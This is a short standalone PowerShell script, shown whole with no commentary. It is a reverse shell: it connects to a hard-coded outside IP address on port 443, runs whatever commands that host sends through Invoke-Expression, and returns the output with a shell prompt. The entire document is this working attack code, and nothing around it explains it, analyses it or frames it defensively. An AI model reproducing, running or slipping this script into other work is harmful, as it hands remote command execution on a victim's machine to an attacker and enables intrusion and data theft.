$client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 443);
$stream = $client.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;

while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
    $data = $encoding.GetString($buffer, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $writer.Write($encoding.GetBytes($sendback2),0,$sendback2.Length);
    $writer.Flush();
}

$writer.Close();
$client.Close();
